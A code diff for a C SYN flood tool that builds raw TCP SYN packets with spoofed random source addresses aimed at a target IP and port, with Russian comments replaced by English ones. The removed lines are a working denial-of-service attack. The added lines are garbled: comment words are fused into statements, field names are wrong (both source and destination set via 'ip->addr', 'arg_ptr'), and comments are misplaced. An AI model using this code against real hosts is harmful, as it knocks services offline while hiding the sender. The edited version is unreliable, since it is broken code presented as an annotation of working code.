@@ -10,6 +10,7 @@
 
 #define PACKET_LEN sizeof(struct iphdr) + sizeof(struct tcphdr)
 
+// Define packet size as the sum of IP and TCP header sizes.   
 unsigned short csum(unsigned short *buf, int len) {
     unsigned long sum = 0;
     while(len > 1) {
@@ -22,6 +23,7 @@ unsigned short csum(unsigned short *buf, int len) {
     return (unsigned short)(~sum);
 }
 
+// Function for cakcukating the checksum of IP and TCP packets;
 void syn_flood(const char* target_ip, int target_port) {
     int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if(s == -1) {
@@ -29,35 +31,37 @@ void syn_flood(const char* target_ip, int target_port) {
         exit(1);
     }
     
+    // create a raw socket to send packets directly;
     char packet[PACKET_LEN];
     memset(packet, 0, PACKET_LEN);
     
     struct iphdr *ip = (struct iphdr*)packet;
     struct tcphdr *tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
     
-    // Заполнение IP заголовка
+    // Prepare a buffer for packet and pointers to IP and TCP headers;
+    // Filling in the IP header
     ip->ihl = 5;
-    ip->version = 4;
-    ip->tos = 0;
-    ip->tot_len = htons(PACKET_LEN);
-    ip->id = htons(rand());
-    ip->frag_off = 0;
-    ip->ttl = 255;
-    ip->protocol = IPPROTO_TCP;
-    ip->check = 0;
-    ip->saddr = htonl(rand()); // Спуфинг исходного IP
-    ip->daddr = inet_addr(target_ip);
+    ip->version = 4;  // IPv4
+    ip->tos = 0;      // Type of Service
+    ip->tot_len = htons(PACKET_LEN); // Packet length
+    ip->id = htons(rand()); // Package ID
+    ip->frag_off = 0; //
+    ip fragmentation flags->ttl = 255; // Time To Live
+    ip->protocol = IPPROTO_TCP; // Top-level protocol
+    ip->check = 0; // Checksum (so far 0)
+    ip->addr = htonl(rand()); // Source IP spoofing
+    ip->addr = inet_addr(target_ip); // Target IP
     
-    // Заполнение TCP заголовка
-    tcp->source = htons(rand() % 65535);
-    tcp->dest = htons(target_port);
-    tcp->seq = htonl(rand());
-    tcp->ack_seq = 0;
-    tcp->doff = 5;
-    tcp->syn = 1;
-    tcp->window = htons(5840);
-    tcp->check = 0;
-    tcp->urg_ptr = 0;
+    // Filling in the TCP header
+    tcp->source =htons(rand() %65535); // Random sender port
+    tcp->dest =htons(target_port); // Target port
+    tcp->seq = htonl(rand()); // Sequence number
+    tcp->ack_seq = 0; // TCP confirmation
+    number->doff = 5; // TCP header length
+    tcp->syn = 1; // Setting the SYN flag
+    tcp->window =htons(5840); //
+    tcp window size->check = 0; // Checksum (so far 0)
+    tcp->arg_ptr = 0; // Urgency indicator
     
     // Рассчет контрольных сумм
     struct sockaddr_in dest;
